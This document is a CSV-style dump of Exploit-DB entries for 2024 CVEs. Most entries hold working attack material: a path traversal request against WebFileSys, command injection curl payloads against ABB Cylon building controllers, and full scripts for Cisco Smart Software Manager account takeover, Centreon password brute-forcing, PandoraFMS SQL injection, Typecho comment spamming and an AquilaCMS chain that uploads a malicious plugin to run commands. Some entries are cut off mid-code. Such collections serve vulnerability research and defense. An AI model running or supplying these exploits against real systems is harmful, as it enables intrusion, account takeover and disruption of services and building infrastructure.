CVE-2024-53586,2025-04-11,exploit db,"# Exploit Title: WebFileSys 2.31.0 - Directory Path Traversal in relPath Parameter # Date: Nov 25, 2024 # Exploit Author: Korn Chaisuwan, Charanin Thongudom, Pongtorn Angsuchotmetee # Vendor Homepage: http://www.webfilesys.de/webfilesys-home/index.html # Software Link: http://www.webfilesys.de/webfilesys-home/download.html # Version: 2.31.0 # Tested on: macOS # CVE : CVE-2024-53586 GET /webfilesys/servlet?command=mobile&cmd=folderFileList&initial=true&relPath=/../../.. HTTP/1.1 Host: www.webfilesys.de Cookie: JSESSIONID=BE9434E13C7CDE33D00D6F484F64EFB8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: https://www.webfilesys.de/webfilesys/servlet?command=menuBar Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Priority: u=0, i Te: trailers Connection: keep-alive"
CVE-2024-56901,2025-04-11,exploit db,"# Exploit Title: GeoVision GV-ASManager 6.1.1.0 - CSRF # Google Dork: inurl:""ASWeb/Login"" # Date: 02-FEB-2025 # Exploit Author: Giorgi Dograshvili [DRAGOWN] # Vendor Homepage: https://www.geovision.com.tw/ # Software Link: https://www.geovision.com.tw/download/product/ # Version: 6.1.1.0 or less # Tested on: Windows 10 | Kali Linux # CVE : CVE-2024-56901"
CVE-2024-56898,2025-04-11,exploit db,"# Exploit Title: Broken Access Control in GeoVision GV-ASManager # Google Dork: inurl:""ASWeb/Login"" # Date: 02-FEB-2025 # Exploit Author: Giorgi Dograshvili [DRAGOWN] # Vendor Homepage: https://www.geovision.com.tw/ # Software Link: https://www.geovision.com.tw/download/product/ # Version: 6.1.0.0 or less # Tested on: Windows 10 | Kali Linux # CVE : CVE-2024-56898"
CVE-2024-48852,2025-04-11,exploit db,"# Exploit Tiltle: ABB Cylon FLXeon 9.3.4 - System Logs Information Disclosure # Vendor: ABB Ltd. # Product web page: https://www.global.abb # Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series) CBX Series (FLX Series) CBT Series CBV Series Firmware: <=9.3.4 Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™ building management solutions. ABB BACnet controllers are designed for intelligent control of HVAC equipment such as central plant, boilers, chillers, cooling towers, heat pump systems, air handling units (constant volume, variable air volume, and multi-zone), rooftop units, electrical systems such as lighting control, variable frequency drives and metering. The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented connectivity and open integration for your building automation systems. It's scalable, and modular, allowing you to control a diverse range of HVAC functions. Desc: An authenticated attacker can access sensitive information via the system logs page of ABB Cylon FLXeon controllers. The logs expose critical data, including the OpenSSL password for stored certificates. This information can be leveraged for further attacks, such as decrypting encrypted communications, impersonation, or gaining deeper system access. Tested on: Linux Kernel 5.4.27 Linux Kernel 4.15.13 NodeJS/8.4.0 Express Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5920 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5920.php CVE ID: CVE-2024-48852 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48852 21.04.2024 $ cat project P R O J E C T $ curl -k ""https://7.3.3.1/api/cmds"" \ # JS > /diagnostics/logs-system (platform-dist) > -H ""Cookie: user_sid=xxx"" \ > -d ""{\""cmd\"":\""journalctl -b -r --no-hostname ^| head -c 600000 \""}"" -- Logs begin at Thu 2024-06-13 10:58:03 EDT, end at Mon 2024-09-09 09:10:33 EDT. -- Feb 13 12:38:26 node[5810]: at endReadableNT (_stream_readable.js:1059:12) Feb 13 12:38:26 node[5810]: at IncomingMessage.emit (events.js:207:7) Feb 13 12:38:26 node[5810]: at emitNone (events.js:105:13) Feb 13 12:38:26 node[5810]: at IncomingMessage.onEnd (/home/MIX_CMIX/node-server/node_modules/raw-body/index.js:273:7) Feb 13 12:38:26 node[5810]: at done (/home/MIX_CMIX/node-server/node_modules/raw-body/index.js:213:7) Feb 13 12:38:26 node[5810]: at invokeCallback (/home/MIX_CMIX/node-serve""} Sep 09 09:10:33 node[5810]: cmd = openssl req -x509 -passin pass:c*******2 -key /usr/local/aam/node-server//certs/cbxi.key.pem -new -sha256 -out /usr/local/aam/node-server//certs/cbxi.cert.pem -subj ""/C=IE/ST=/L=Dublin/O=Cylon Controls/OU=/CN="" Sep 09 09:08:18 node[5810]: cmd = openssl req -x509 -passin pass:c*******2 -key /usr/local/aam/node-server//certs/cbxi.key.pem -new -sha256 -out /usr/local/aam/node-server//certs/cbxi.cert.pem -subj ""/C=IE/ST=/L=Dublin/O=Cylon Controls/OU=/CN="" Sep 09 09:00:12 node[5810]: Error: ENOENT: no such file or directory, stat '/usr/local/aam/node-server/certs/cbxi.csr.pem' Sep 09 08:59:58 node[5810]: Error: ENOENT: no such file or directory, stat '/usr/local/aam/node-server/certs/cbxi.csr.pem' Sep 09 08:59:41 node[5810]: Error: ENOENT: no such file or directory, stat '/usr/local/"
CVE-2024-48849,2025-04-11,exploit db,# ABB Cylon FLXeon 9.3.4 (wsConnect.js) WebSocket Command Spawning
CVE-2024-48841,2025-04-11,exploit db,"# Exploit title: ABB Cylon FLXeon 9.3.4 - Remote Code Execution (RCE) # Vendor: ABB Ltd. # Product web page: https://www.global.abb # Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series) CBX Series (FLX Series) CBT Series CBV Series Firmware: <=9.3.4 Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™ building management solutions. ABB BACnet controllers are designed for intelligent control of HVAC equipment such as central plant, boilers, chillers, cooling towers, heat pump systems, air handling units (constant volume, variable air volume, and multi-zone), rooftop units, electrical systems such as lighting control, variable frequency drives and metering. The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented connectivity and open integration for your building automation systems. It's scalable, and modular, allowing you to control a diverse range of HVAC functions. Desc: The ABB Cylon FLXeon BACnet controller is vulnerable to authenticated remote root code execution via the /api/users/password endpoint. An attacker with valid credentials can inject arbitrary system commands by manipulating the newPassword PUT parameter. The issue arises in users.js, where the new password is hashed and improperly escaped before being passed to ChildProcess.exec() within a usermod command, allowing out of band (blind) command injection. Tested on: Linux Kernel 5.4.27 Linux Kernel 4.15.13 NodeJS/8.4.0 Express Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5912 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5912.php CVE ID: CVE-2024-48841 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48841 21.04.2024 $ cat project P R O J E C T $ curl -k -X PUT ""https://7.3.3.1/api/users/password"" \ > -H ""Cookie: user_sid=xxx"" \ > -H ""Content-Type: application/json"" \ > --data '{""oldPassword"":""KAKA"",""newPassword"":""ZULU`sleep 7`""}'"
CVE-2024-48841,2025-04-11,exploit db,"# Exploit Title: ABB Cylon FLXeon 9.3.4 - Remote Code Execution (Authenticated) # Vendor: ABB Ltd. # Product web page: https://www.global.abb # Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series) CBX Series (FLX Series) CBT Series CBV Series Firmware: <=9.3.4 Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™ building management solutions. ABB BACnet controllers are designed for intelligent control of HVAC equipment such as central plant, boilers, chillers, cooling towers, heat pump systems, air handling units (constant volume, variable air volume, and multi-zone), rooftop units, electrical systems such as lighting control, variable frequency drives and metering. The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented connectivity and open integration for your building automation systems. It's scalable, and modular, allowing you to control a diverse range of HVAC functions. Desc: The ABB Cylon FLXeon BACnet controller is vulnerable to authenticated remote root code execution via the /api/timeConfig endpoint. An attacker with valid credentials can inject arbitrary system commands by manipulating parameters such as tz, timeServerYN, and multiple timeDate fields. The vulnerability exists due to improper input validation in timeConfig.js, where user-supplied data is executed via ChildProcess.exec() without adequate sanitization. Tested on: Linux Kernel 5.4.27 Linux Kernel 4.15.13 NodeJS/8.4.0 Express Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2025-5910 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5910.php CVE ID: CVE-2024-48841 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48841 21.04.2024 $ cat project P R O J E C T $ curl -k -X PUT ""https://7.3.3.1/api/timeConfig"" \ > -H ""Cookie: user_sid=xxx"" \ > -H ""Content-Type: application/json"" \ > -d '{""timeConfig"":{""timeDate"":{\ > ""yy"":""`sleep 17`"",\ > ""mm"":""`sleep 17`"",\ > ""dd"":""`sleep 17`"",\ > ""h"":""`sleep 17`"",\ > ""m"":""`sleep 17`"",\ > ""s"":""`sleep 17`""},\ > ""tz"":""`sleep 17`"",\ > ""tzList"":[],\ > ""timeServerYN"":""`sleep 17`"",\ > ""timeServer"":""1.1.1.1"",\ > ""timeServerSync"":false}}'"
CVE-2024-36424,2025-04-10,exploit db,"# Exploit Title: K7 Ultimate Security K7RKScan.sys 17.0.2019 - Denial Of Service (DoS) # Date: 13.08.2024 # Author: M. Akil Gündoğan # Vendor Homepage: https://k7computing.com/ # Version: < v17.0.2019 # Tested on: Windows 10 Pro x64 # CVE ID: CVE-2024-36424 # Vulnerability Description: In K7 Ultimate Security < v17.0.2019, the driver file (K7RKScan.sys - this version 15.1.0.7) allows local users to cause a denial of service (BSOD) or possibly have unspecified other impact because of null pointer dereference from IOCtl 0x222010 and 0x222014. At the same time, the drive is accessible to all users in the ""Everyone"" group. # Technical details and step by step Proof of Concept's ("
CVE-2024-6039,2025-04-10,exploit db,"# Exploit Title: Feng Office 3.11.1.2 - SQL Injection # Date: 7/2024 # Exploit Author: Andrey Stoykov # Version: 3.11.1.2 # Tested on: Ubuntu 22.04 # Blog: http://msecureltd.blogspot.com SQL Injection: 1. Login to application 2. Click on ""Workspaces"" 3. Copy full URL 4. Paste the HTTP GET request into text file 5. Set the injection point to be in the ""dim"" parameter value 6. Use SQLMap to automate the process sqlmap -r request.txt --threads 1 --level 5 --risk 3 --dbms=3Dmysql -p dim = --fingerprint [12:13:03] [INFO] confirming MySQL [12:13:04] [INFO] the back-end DBMS is MySQL [12:13:04] [INFO] actively fingerprinting MySQL [12:13:05] [INFO] executing MySQL comment injection fingerprint web application technology: Apache back-end DBMS: active fingerprint: MySQL >=3D 5.7 comment injection fingerprint: MySQL 5.7.37"
CVE-2024-20419,2025-04-10,exploit db,"# Exploit Title: Cisco Smart Software Manager On-Prem 8-202206 - Account Takeover # Google Dork: N/A # Date: 21/07/2024 # Exploit Author: Mohammed Adel # Vendor Homepage: https://www.cisco.com # Software Link: https://www.cisco.com/c/en/us/products/collateral/cloud-systems-management/smart-software-manager-satellite/datasheet-c78-734539.html # Version: 8-202206 and earlier # Tested on: Kali Linux # CVE : CVE-2024-20419 # Security Advisory: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy # Technical Analysis: https://www.0xpolar.com/blog/CVE-2024-20419 import requests, sys from urllib.parse import unquote # Suppress SSL warnings requests.packages.urllib3.disable_warnings() Domain = sys.argv[1] # Domain, https://0xpolar.com:8443 Username = sys.argv[2] # Username, by default its [admin] password = ""Polar@123456780"" print(""[*] Cisco Smart Software Manager On-Prem"") print(""[*] Account Takeover Exploit"") print(""[*] Target: ""+Domain) print(""[*] Username: ""+Username) print(""\n"") print(""[*] Getting Necessary Tokens.."") get_url = Domain+""/backend/settings/oauth_adfs?hostname=polar"" response = requests.get(get_url, verify=False) def get_cookie_value(headers, cookie_name): cookies = headers.get('Set-Cookie', '').split(',') for cookie in cookies: if cookie_name in cookie: parts = cookie.split(';') for part in parts: if cookie_name in part: return part.split('=')[1].strip() return None set_cookie_headers = response.headers.get('Set-Cookie', '') xsrf_token = get_cookie_value(response.headers, 'XSRF-TOKEN') lic_engine_session = get_cookie_value(response.headers, '_lic_engine_session') if xsrf_token: xsrf_token = unquote(xsrf_token) if not lic_engine_session or not xsrf_token: print(""Required cookies not found in the response."") else: print(""[+] lic_engine_session: ""+lic_engine_session) print(""[+] xsrf_token: ""+xsrf_token) print(""\n[*] Generating Auth Token"") post_url = Domain+""/backend/reset_password/generate_code"" headers = { 'Accept': 'application/json', 'Content-Type': 'application/json', 'X-Xsrf-Token': xsrf_token, 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Mobile': '?0', cookies = { '_lic_engine_session': lic_engine_session, 'XSRF-TOKEN': xsrf_token, payload = { 'uid': Username post_response = requests.post(post_url, headers=headers, cookies=cookies, json=payload, verify=False) post_response_json = post_response.json() auth_token = post_response_json.get('auth_token') if not auth_token: print(""auth_token not found in the response."") else: print(""[+] Auth Token: ""+auth_token) print(""\n[*] Setting Up a New Password"") final_post_url = Domain+""/backend/reset_password"" final_headers = { 'Accept': 'application/json', 'Content-Type': 'application/json', 'X-Xsrf-Token': xsrf_token, final_cookies = { '_lic_engine_session': lic_engine_session, 'XSRF-TOKEN': xsrf_token, final_payload = { 'uid': Username, 'auth_token': auth_token, 'password': password, 'password_confirmation': password, 'common_name': '' final_post_response = requests.post(final_post_url, headers=final_headers, cookies=final_cookies, json=final_payload, verify=False) response_text = final_post_response.text if ""OK"" in response_text: print(""[+] Password Successfully Changed!"") print(""[+] Username: ""+Username) print(""[+] New Password: ""+password) else: print(""[!] Something Went Wrong"") print(response_text)"
CVE-2019-13024,2025-04-10,exploit db,"# Exploit Title : Centron 19.04 - Remote Code Execution (RCE) # Tested on Centreon API 19.04.0 # Centreon 19.04 - Login Password Bruteforcer # Written on 6 Nov 2019 # Referencing API Authentication of the Centreon API document # Author: st4rry # centbruteon.py # Centreon Download Link: https://download.centreon.com/#version-Older # Dependencies: sys, requests, argparse, termcolor, os #!/usr/bin/env python3 import sys import requests import argparse from termcolor import colored import os def main(): parser = argparse.ArgumentParser() parser.add_argument('-u', dest='host', help='Define your target URL', required=True) parser.add_argument('-p', dest='port', type=int, help='Specify port number', default=80) parser.add_argument('--https', dest='https', action='store_true', help='Use HTTPS instead of HTTP') parser.add_argument('-l', dest='username', help='Specific username') parser.add_argument('-L', dest='userfile', type=argparse.FileType('r'), help='Username wordlist') parser.add_argument('-w', dest='passwfile', type=argparse.FileType('r'), help='Specify Password wordlist', required=True) parser.add_argument('--insecure', action='store_true', help='Skip SSL certificate verification') parser.add_argument('--ca-bundle', dest='ca_bundle', help='Path to custom CA bundle') if len(sys.argv) == 1: parser.print_help(sys.stderr) sys.exit(1) args = parser.parse_args() protocol = 'https' if args.https else 'http' server = f""{protocol}://{args.host}:{args.port}"" user = args.username passfile = args.passwfile.read().splitlines() userfile = args.userfile dirlo = '/centreon/api/index.php?action=authenticate' verify_ssl = not args.insecure if args.ca_bundle: verify_ssl = args.ca_bundle if user: brute_force_single_user(server, user, passfile, dirlo, verify_ssl) elif userfile: usrwl = userfile.read().splitlines() brute_force_multiple_users(server, usrwl, passfile, dirlo, verify_ssl) else: print(colored('Something went wrong!', 'red')) sys.exit(1) def brute_force_single_user(server, user, passfile, dirlo, verify_ssl): for password in passfile: data = {'username': user, 'password': password} r = requests.post(f'{server}{dirlo}', data=data, verify=verify_ssl) try: print('Processing...') print(colored('Brute forcing on Server: ', 'yellow') + colored(server, 'yellow') + colored(' Username: ', 'yellow') + colored(user, 'yellow') + colored(' Password: ', 'yellow') + colored(password, 'yellow')) if r.status_code == 200: print(colored('Credentials found: username: ', 'green') + colored(user, 'green') + colored(' password: ', 'green') + colored(password, 'green') + colored(' server: ', 'green') + colored(server, 'green')) print(colored('Token: ', 'cyan') + colored(r.content.decode(), 'cyan')) print('\n') break else: print(colored('403 - Unauthenticated!', 'red')) except IndexError: print(colored('Something went wrong', 'red')) def brute_force_multiple_users(server, usrwl, passfile, dirlo, verify_ssl): for usr in usrwl: for password in passfile: data = {'username': usr, 'password': password} r = requests.post(f'{server}{dirlo}', data=data, verify=verify_ssl) try: print('Processing...') print(colored('Brute forcing on Server: ', 'yellow') + colored(server, 'yellow') + colored(' Username: ', 'yellow') + colored(usr, 'yellow') + colored(' Password: ', 'yellow') + colored(password, 'yellow')) if r.status_code == 200: print(colored('Credentials found: username: ', 'green') + colored(usr, 'green') + colored(' password: ', 'green') + colored(password, 'green') + colored(' server: ', 'green') + colored(server, 'green')) print(colored('Token: ', 'cyan') + colored(r.content.decode(), 'cyan')) print('\n') else: print(colored('403 - Unauthenticated!', 'red')) except IndexError: print(colored('Something went wrong', 'red')) if __name__ == '__main__': main()"
CVE-2023-44088,2025-04-10,exploit db,"# Exploit Title: PandoraFMS 7.0NG.772 - SQL Injection # Date: 21/11/2023 # Exploit Author: Osama Yousef # Vendor Homepage: https://pandorafms.com/ # Software Link: https://github.com/pandorafms/pandorafms/releases/download/v772-LTS/pandorafms_agent_linux-7.0NG.772.tar.gz # Version: v7.0NG.772 # Tested on: Linux # CVE : CVE-2023-44088 import re, requests, argparse, string, random, base64 import urllib3 import html headers = { 'Cache-Control': 'max-age=0', 'Origin': '', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36', 'Accept': '*/*', 'Referer': '' def login(session, url, username, password): res = session.get(url) csrf = retrieve_csrftoken(res.text) url+= '?login=1' payload = ""nick={}&pass={}&login_button=Let%27s+go&csrf_code={}"" res = session.post(url, data=payload.format(username, password, csrf), headers={'Content-Type': 'application/x-www-form-urlencoded'}) if 'User is blocked' in res.text: print(""Login Failed!"") exit(1) def exploit(session, url, imagepath, query): url1 = url + ""?sec=network&sec2=godmode/reporting/visual_console_builder&tab=data"" name = random_id(10) payload = ""{}.jpg',({}),'1','1','1','1');-- helloo.jpg"".format(name, query) payload=payload.replace(' ', '\t') files = {""background_image"": (payload, open(imagepath, 'rb').read(), 'image/jpeg')} # Create a reference to the original _make_request method urllib3.connectionpool.HTTPConnectionPool._original_make_request = urllib3.connectionpool.HTTPConnectionPool._make_request # Replace the _make_request method with the custom_make_request function urllib3.connectionpool.HTTPConnectionPool._make_request = custom_make_request res = session.post(url1, files=files, data={'action':'save', 'name':name, 'id_group': 0, 'background_image': 'None.png', 'background_color': '#ffffff', 'width': '1024', 'height': '768', 'is_favourite_sent': '0', 'auto_adjust_sent': '0', 'update_layout': 'Save'}) if 'Created successfully' not in res.text: print(""Failed to create a visual console!"") exit(1) url2 = url + ""?sec=godmode/reporting/map_builder&sec2=godmode/reporting/map_builder"" res = session.get(url2) x = re.search('(?: )'+name, res.text) match = x.group() url3 = match.lstrip(""<a href="") url3 = url3.split('""')[1] url3 = url3.split(""?"")[1] url3 = html.unescape(url3) url4 = url+ ""?"" + url3 res = session.get(url4) x = re.search('(?:var props = {""autoAdjust"":true,""backgroundColor"":"".*"",""backgroundImage"")', res.text) match = x.group() output = match.lstrip('var props = {""autoAdjust"":true,""backgroundColor"":""') output = output.split('"",""backgroundImage')[0] print(""Query output: {}"".format(output)) def retrieve_csrftoken(response): x = re.search('(?:<input id=""hidden-csrf_code"" name=""csrf_code"" type=""hidden"" value="")[a-zA-Z0-9]*(?:"")', response) match = x.group() csrf = match.lstrip('<input id=""hidden-csrf_code"" name=""csrf_code"" type=""hidden"" value=""').rstrip('""') print(""CSRF: {}"".format(csrf)) return csrf def random_id(len): chars = string.ascii_uppercase + string.ascii_lowercase + string.digits return ''.join(random.choice(chars) for _ in range(len)) def custom_make_request(self, conn, method, url, timeout=urllib3.connectionpool._Default, chunked=False, **httplib_request_kw): body = httplib_request_kw['body'] if body: body = body.replace(b""%09"", b""\t""*3) httplib_request_kw['body'] = body return self._original_make_request(conn, method, url, timeout=timeout, chunked=chunked, **httplib_request_kw) def main(): ap = argparse.ArgumentParser() ap.add_argument(""-t"", ""--target"", required=True, help=""Target URI"") ap.add_argument(""-u"", ""--username"", required=True, help=""Username"") ap.add_argument(""-p"", ""--password"", required=True, help=""Password"") ap.add_argument(""-i"", ""--image"", required=True, help=""Image path"") ap.add_argument(""-q"", ""--query"", required=True, help=""SQL Query to execute"") ap.add_argument(""-x"", ""--proxy"", required=False, help=""Proxy Configuration (e.g., http://127.0.0.1:8080/)"") args = vars(ap.parse_args()) session = requests.Session() url = args['target'] if 'pandora_console' not in url: if not url.endswith('/'): url += '/' url += 'pandora_console/' headers['Origin'] = args['target'] headers['Referer'] = args['target'] session.headers.update(headers) proxies = {} if args['proxy'] is not None: if 'https' in args['proxy']: proxies['https'] = args['proxy'] else: proxies['http'] = args['proxy'] session.proxies.update(proxies) login(session, url, args['username'], args['password']) exploit(session, url, args['image'], args['query']) if __name__=='__main__': main()"
CVE-2024-7815,2025-04-10,exploit db,# Exploit Title: CodeAstro Online Railway Reservation System 1.0 - Cross Site Scripting (XSS) # Date: 2024-08-15 # Exploit Author: Raj Nandi # Vendor Homepage: https://codeastro.com/ # Software Link: https://codeastro.com/online-railway-reservation-system-in-php-with-source-code/ # Version: 1.0 # Tested on: Any OS # CVE: CVE-2024-7815 ## Description: A Cross-Site Scripting (XSS) vulnerability exists in [Application Name/Version]. This vulnerability allows an attacker to inject and execute arbitrary JavaScript code within the context of the user's browser session. ## Proof of Concept (
CVE-2024-35539,2025-04-10,exploit db,"# Exploit Title: Typecho 1.3.0 - Race Condition # Google Dork: intext:""Powered by Typecho"" inurl:/index.php # Date: 18/08/2024 # Exploit Author: Michele 'cyberaz0r' Di Bonaventura # Vendor Homepage: https://typecho.org # Software Link: https://github.com/typecho/typecho # Version: 1.3.0 # Tested on: Typecho 1.3.0 Docker Image with PHP 7.4 (https://hub.docker.com/r/joyqi/typecho) # CVE: CVE-2024-35539 # For more information, visit the blog post: https://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/ package main import ( ""bytes"" ""fmt"" ""io"" ""net/http"" ""net/url"" ""os"" ""strings"" ""sync"" ""sync/atomic"" ""time"" ""github.com/robertkrimen/otto"" var ( c int32 = 0 commentsPostInterval int64 = 60 maxThreads int = 1000 wg sync.WaitGroup userAgent string = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"" client *http.Client = &http.Client{ CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse func getJSFunction(u string) string { req, err := http.NewRequest(""GET"", u, nil) if err != nil { fmt.Println(""[X] Error creating initial request:"", err) return """" req.Header.Set(""User-Agent"", userAgent) resp, err := client.Do(req) if err != nil { fmt.Println(""[X] Error sending initial request:"", err) return """" buf := new(bytes.Buffer) buf.ReadFrom(resp.Body) body := buf.String() if !strings.Contains(body, ""input.value = ("") || !strings.Contains(body, "")();;"") { fmt.Println(""[X] Error finding JavaScript function"") return """" jsFunction := strings.Split(body, ""input.value = ("")[1] jsFunction = strings.Split(jsFunction, "")();;"")[0] return jsFunction func executeJavaScript(jsFunctionName string, jsFunctionBody string) string { vm := otto.New() _, err := vm.Run(jsFunctionBody) if err != nil { fmt.Println(""[X] Error executing JavaScript function:"", err) return """" result, err := vm.Call(jsFunctionName, nil) if err != nil { fmt.Println(""[X] Error calling JavaScript function:"", err) return """" returnValue, err := result.ToString() if err != nil { fmt.Println(""[X] Error converting JavaScript result to string:"", err) return """" return returnValue func spamComments(u string, formToken string) { timestamp := time.Now().Unix() for { i := 0 for time.Now().Unix() < timestamp-1 { time.Sleep(250 * time.Millisecond) fmt.Printf(""\r[*] Waiting for next spam wave... (%d seconds) "", timestamp-time.Now().Unix()-1) fmt.Printf(""\n"") for time.Now().Unix() < timestamp+2 { if i < maxThreads { wg.Add(1) go spamRequest(u, formToken, i) i++ wg.Wait() fmt.Printf(""\n[+] Successfully spammed %d comments\n"", c) timestamp = time.Now().Unix() + commentsPostInterval func spamRequest(u string, formToken string, i int) { fmt.Printf(""\r[*] Spamming comment request %d "", i) defer wg.Done() formData := url.Values{} formData.Set(""_"", formToken) formData.Set(""author"", fmt.Sprintf(""user_%d"", i)) formData.Set(""mail"", fmt.Sprintf(""user%d@test.example"", i)) formData.Set(""text"", fmt.Sprintf(""Hello from user_%d"", i)) req, err := http.NewRequest(""POST"", u+""comment"", nil) if err != nil { return req.Header.Set(""Referer"", u) req.Header.Set(""User-Agent"", userAgent) req.Header.Set(""Content-Type"", ""application/x-www-form-urlencoded"") req.Header.Set(""Content-Length"", fmt.Sprint(len(formData.Encode()))) req.Body = io.NopCloser(strings.NewReader(formData.Encode())) resp, err := client.Do(req) if err != nil { return if resp.StatusCode == 302 { atomic.AddInt32(&c, 1) defer resp.Body.Close() func main() { if len(os.Args) != 2 { fmt.Println(""Usage: go run CVE-2024-35538.go "") return fmt.Println(""[+] Starting Typecho <= 1.3.0 Race Condition exploit (CVE-2024-35539) by cyberaz0r"") targetUrl := os.Args[1] fmt.Println(""[+] Spam target:"", targetUrl) fmt.Println(""[*] Getting JavaScript function to calculate form token..."") jsFunction := getJSFunction(targetUrl) if jsFunction == """" { fmt.Println(""[-] Could not get JavaScript function, exiting..."") return fmt.Println(""[*] Evaluating JavaScript function to calculate form token..."") formToken := executeJavaScript(""calculateToken"", strings.Replace(jsFunction, ""function ()"", ""function calculateToken()"", 1)) if formToken == """" { fmt.Println(""[-] Could not get form token, exiting..."") return fmt.Printf(""[+] Form token: %s"", formToken) spamComments(targetUrl, formToken)"
CVE-2024-35540,2025-04-10,exploit db,"# Exploit Title: Typecho 1.3.0 - Stored Cross-Site Scripting (XSS) # Google Dork: intext:""Powered by Typecho"" inurl:/index.php # Date: 18/08/2024 # Exploit Author: Michele 'cyberaz0r' Di Bonaventura # Vendor Homepage: https://typecho.org # Software Link: https://github.com/typecho/typecho # Version: 1.3.0 # Tested on: Typecho 1.3.0 Docker Image with PHP 7.4 (https://hub.docker.com/r/joyqi/typecho) # CVE: CVE-2024-35540 # For more information, visit the blog post: https://cyberaz0r.info/2024/08/typecho-multiple-vulnerabilities/ package main import ( ""bufio"" ""bytes"" ""crypto/rand"" ""crypto/sha256"" ""encoding/base64"" ""fmt"" ""net/http"" ""net/url"" ""os"" ""strings"" ""time"" var ( postTitle string = ""Reflected XSS"
CVE-2024-48573,2025-04-10,exploit db,"# Exploit Title: AquilaCMS 1.409.20 - Remote Command Execution (RCE) # Date: 2024-10-25 # Exploit Author: Eui Chul Chung # Vendor Homepage: https://www.aquila-cms.com/ # Software Link: https://github.com/AquilaCMS/AquilaCMS # Version: v1.409.20 # CVE: CVE-2024-48572, CVE-2024-48573 import io import json import uuid import string import zipfile import argparse import requests import textwrap def unescape_special_characters(email): return ( email.replace(""[$]"", ""$"") .replace(""[*]"", ""*"") .replace(""[+]"", ""+"") .replace(""[-]"", ""-"") .replace(""[.]"", ""."") .replace(""[?]"", ""?"") .replace(r""[\^]"", ""^"") .replace(""[|]"", ""|"") def get_user_emails(): valid_characters = list( string.ascii_lowercase + string.digits + ""!#%&'/=@_`{}~"" ) + [""[$]"", ""[*]"", ""[+]"", ""[-]"", ""[.]"", ""[?]"", r""[\^]"", ""[|]""] emails_found = [] next_emails = [""^""] while next_emails: prev_emails = next_emails next_emails = [] for email in prev_emails: found = False for ch in valid_characters: data = {""email"": f""{email + ch}.*""} res = requests.put(f""{args.url}/api/v2/user"", json=data) if json.loads(res.text)[""code""] == ""UserAlreadyExist"": next_emails.append(email + ch) found = True if not found: emails_found.append(email[1:]) print(f""[+] {unescape_special_characters(email[1:])}"") return emails_found def reset_password(email): data = {""email"": email} requests.post(f""{args.url}/api/v2/user/resetpassword"", json=data) data = {""token"": {""$ne"": None}, ""password"": args.password} requests.post(f""{args.url}/api/v2/user/resetpassword"", json=data) print(f""[+] {unescape_special_characters(email)} : {args.password}"") def get_admin_auth_token(emails): for email in emails: data = {""username"": email, ""password"": args.password} res = requests.post(f""{args.url}/api/v2/auth/login/admin"", json=data) if res.status_code == 200: print(f""[+] Administrator account : {unescape_special_characters(email)}"") return json.loads(res.text)[""data""] return None def create_plugin(plugin_name): payload = textwrap.dedent( f"""""" const {{ exec }} = require(""child_process""); * This function is called when the plugin is desactivated or when we delete it module.exports = async function (resolve, reject) {{ try {{ exec(""{args.command}""); return resolve(); }} catch (error) {{}} ).strip() plugin = io.BytesIO() with zipfile.ZipFile(plugin, ""a"", zipfile.ZIP_DEFLATED, False) as zip_file: zip_file.writestr( f""{plugin_name}/package.json"", io.BytesIO(f'{{ ""name"": ""{plugin_name}"" }}'.encode()).getvalue(), zip_file.writestr( f""{plugin_name}/info.json"", io.BytesIO(b'{ ""info"": {} }').getvalue() zip_file.writestr( f""{plugin_name}/uninit.js"", io.BytesIO(payload.encode()).getvalue() plugin.seek(0) return plugin def rce(emails): auth_token = get_admin_auth_token(emails) if auth_token is None: print(""[-] Administrator account not found"") return print(""[+] Create malicious plugin"") plugin_name = uuid.uuid4().hex plugin = create_plugin(plugin_name) print(""[+] Upload plugin"") headers = {""Authorization"": auth_token} files = {""file"": (f""{plugin_name}.zip"", plugin, ""application/zip"")} requests.post(f""{args.url}/api/v2/modules/upload"", headers=headers, files=files) print(""[+] Find uploaded plugin"") headers = {""Authorization"": auth_token} data = {""PostBody"": {""limit"": 0}} res = requests.post(f""{args.url}/api/v2/modules"", headers=headers, json=data) plugin_id = None for data in json.loads(res.text)[""datas""]: if data[""name""] == plugin_name: plugin_id = data[""_id""] print(f""[+] Plugin ID : 